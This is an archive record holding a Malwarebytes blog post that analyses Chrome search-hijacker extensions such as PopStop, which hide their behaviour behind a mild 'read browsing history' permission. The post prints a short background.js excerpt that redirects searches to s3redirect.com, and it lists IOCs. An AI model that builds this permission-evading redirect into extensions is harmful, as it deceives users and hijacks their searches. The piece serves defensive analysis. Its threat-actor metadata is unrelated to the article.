{
    "id": "f88b0574-fd9d-4e38-9ce6-904c4f0ce4f2",
    "created_at": "2023-01-12T15:02:32.866213Z",
    "updated_at": "2025-03-27T02:09:29.365639Z",
    "deleted_at": null,
    "sha1_hash": "e5cf1033a00fffc6434cd79ede51dde6bec13717",
    "title": "2020-08-13 - Chrome extensions that lie about their permissions",
    "authors": "",
    "file_creation_date": "2022-05-27T19:59:08Z",
    "file_modification_date": "2022-05-27T19:59:08Z",
    "file_size": 372630,
    "plain_text": "# Chrome extensions that lie about their permissions\n\n**[blog.malwarebytes.com/puppum/2020/08/chrome-extensions-that-lie-about-their-permissions/](https://blog.malwarebytes.com/puppum/2020/08/chrome-extensions-that-lie-about-their-permissions/)**\n\nPieter Arntz August 13, 2020\n\n“But I checked the permissions before I installed this pop-up-blocker—it said nothing about\nchanging my searches,” my dad retorts after I scold him for installing yet another searchhijacking Chrome extension. Granted, they are not hard to remove, but having to do it over\nand over is a nuisance. This is especially true because it can be hard to find out which of the\nChrome extensions is the culprit if the browser starts acting up.\n\n## What happened?\n\nRecently, we came across a family of search hijackers that are deceptive about the\npermissions they are going to use in their install prompt. This extension, called PopStop,\nclaims it can only read your browsing history. Seems harmless enough, right?\n\n\n-----\n\nThe install prompt in the webstore is supposed to give you accurate information about the\npermissions the extension you are about to install requires. It already is habit for browser\nextensions to only ask for permissions needed to function properly up front—then ask for\nadditional permissions later on after installing. Why? Users are more likely to trust an\nextension with limited warnings or when permissions are explained to them.\n\nBut what is the use of these informative prompts if they only give you half the story? In this\ncase, the PopStop extension doesn’t just read your browsing history, as the pop-up explains,\nbut it also hijacks your search results.\n\nSome of these extensions are more straightforward once the user installs them and they are\nlisted under the installed extensions.\n\nBut others are consistent in their lies even after they have been installed, which makes it\neven harder to find out which one is responsible for the search hijack.\n\n\n-----\n\n## How is this possible?\n\nGoogle had at some point decided to bar extensions that obfuscate their code. By doing so,\nit’s easier for them to read the plug-in’s programming and conduct appropriate analysis.\n\nThe first step in determining what an extension is up to is in looking at the manifest.json file.\n\nRegistering a script in the manifest tells the extension which file to reference, and, optionally,\nhow that file should behave.\n\nWhat this manifest tells us is that the only active script is “background.js” and the declared\npermissions are “tabs” and “storage”. More about those permissions later on.\n\nThe relevant parts in background.js are these pieces, because they show us where our\nsearches are going:\n\n\n-----\n\n```\nconst BASE_DOMAIN s3redirect.com, pid 9126, ver 401;\nchrome.tabs.create({url: `https://${BASE_DOMAIN}/chrome3.php?q=${searchQuery}`});\n    setTimeout(() => {\n     chrome.tabs.remove(currentTabId);\n    }, 10);\n\n```\nThis script uses two chrome.tabs methods: One to create a new tab based on your search\nquery, and the other to close the current tab. The closed tab would have displayed the\nsearch results from your default search provider.\n\n[Looking at the chrome.tabs API, we read:](https://developer.chrome.com/extensions/tabs)\n\n“You can use most chrome.tabs methods and events without declaring any\npermissions in the extension’s manifest file. However, if you require access to the url,\npendingUrl, title, or favIconUrl properties of tabs.Tab, you must declare the “tabs”\npermission in the manifest.”\n\nAnd indeed, in the manifest of this extension we found:\n```\n\"permissions\": [ \"tabs\", \"storage\" ],\n\n```\nThe “storage” permission does not invoke a message in the warning screen users see when\nthey install an extension. The “tabs” permission is the reason for the “Read your browsing\nhistory” message. Although the chrome.tabs API might be used for different reasons, it can\nalso be used to see the URL that is associated with every newly-opened tab.\n\nThe extensions we found managed to avoid having to display the message, “Read and\nchange all your data on the websites you visit” that would be associated with the\n“tabCapture” method. They did this by closing the current tab after capturing your search\nterm and opening a new tab to perform the search for that term on their own site.\n\nThe “normal” permission warnings for a search hijacker would look more similar to this:\n\n\n-----\n\nThe end effect is the same, but an experienced user would be less likely to install this last\nextension, as they would either balk at the permission request or recognize the plug-in as a\nsearch hijacker by looking at these messages.\n\n## Are these extensions really lying?\n\nSome might call it a lie. Some may say no, they simply didn’t offer the whole truth. However,\nthe point of those permissions pop-ups is to give users the choice on whether to download a\nprogram by being upfront about what that program asks of its users.\n\nIn the case of these Chrome extensions, then, let’s just say that they’re not disclosing the full\nextent of the consequences of installing their extensions.\n\nIt might be desirable if Google were to add a possible message for extensions that use the\nchrome.tabs.create method. This would inform the user that his extension will be able to\nopen new tabs, which is one way of showing advertisements so users would be made aware\nof this possibility. And chrome.tabs.create also happens to be the method that this extension\nuses to replace the search results we were after with their own.\n\nAn additional advantage for these extensions is the fact that they don’t get mentioned in the\nsettings menu as a “regular” search hijacker would.\n\nA\n\nsearch hijacker that replaces your default search engine would be listed under Settings >\nSearch engine\nNot being listed as the search engine replacement, again, makes it harder for a user to figure\nout which extension might be responsible for the unexpected search results.\n\nFor the moment, these hijackers can be recognized by the new header they add to their\nsearch results, which looks like this:\n\n\n-----\n\nThis will probably change once their current domains are flagged as landing pages for\nhijackers, and new extensions will be created using other landing pages.\n\n## Further details\n\nThese extensions intercept search results from these domains:\n\naliexpress.com\nbooking.com\nall google domains\nask.com\necosia.org\nbing.com\nyahoo.com\nmysearch.com\nduckduckgo.com\n\nIt also intercepts all queries that contain the string “spalp2020”. This is probably because that\nstring is a common factor in the installer url’s that belong to the [powerapp.download family of](https://blog.malwarebytes.com/detections/powerapp-download/)\nhijackers.\n\n## Search hijackers\n\nWe have written before about the interests of shady developers in the billion-dollar search\nindustry and reported on the different tactics these developers resort to in order to get users\n[to install their extensions or use their search sites[1],[2],[3].](https://blog.malwarebytes.com/threat-spotlight/2020/06/search-hijackers-change-chrome-policy-to-remote-administration/)\n\n\n-----\n\nWhile this family doesn t use the most deceptive marketing practices out there, it still hides\nits bad behavior in plain sight. Many users have learned to read the install prompt messages\ncarefully to determine whether an extension is safe. It’s disappointing that developers can\nevade giving honest information and that these extensions make their way into the webstore\nover and again.\n\n## IOC’s\n\n**extension identifiers:**\n\npcocncapgaibfcjmkkalopefmmceflnh\n\ndpnebmclcgcbggnhicpocghdhjmdgklf\n\n**search domains:**\n\ns3redirect.com\n\ns3arch.page\n\ngooogle.page <= note the extra “o”\n\nMalwarebytes detects these extension under the detection name\n[PUP.Optional.SearchEngineHijack.Generic.](https://blog.malwarebytes.com/detections/pup-optional-searchenginehijack/)\n\nStay safe, everyone!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-08-13 - Chrome extensions that lie about their permissions.pdf"
    ],
    "report_names": [
        "2020-08-13 - Chrome extensions that lie about their permissions.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f809bfcb-b200-4988-80a8-be78ef6a52ef",
            "created_at": "2023-01-06T13:46:39.186988Z",
            "updated_at": "2025-03-27T02:00:03.016358Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "Adept Libra"
            ],
            "source_name": "MISPGALAXY:TeamTNT",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c3ca592f-0669-49bd-ab5c-310007ab2fb4",
            "created_at": "2022-10-25T15:50:23.334495Z",
            "updated_at": "2025-03-27T02:00:55.445098Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "TeamTNT"
            ],
            "source_name": "MITRE:TeamTNT",
            "tools": [
                "Peirates",
                "MimiPenguin",
                "LaZagne",
                "Hildegard"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535752,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1653681548,
    "ts_modification_date": 1653681548,
    "files": {
        "pdf": "https://archive.orkl.eu/e5cf1033a00fffc6434cd79ede51dde6bec13717.pdf",
        "text": "https://archive.orkl.eu/e5cf1033a00fffc6434cd79ede51dde6bec13717.txt",
        "img": "https://archive.orkl.eu/e5cf1033a00fffc6434cd79ede51dde6bec13717.jpg"
    }
}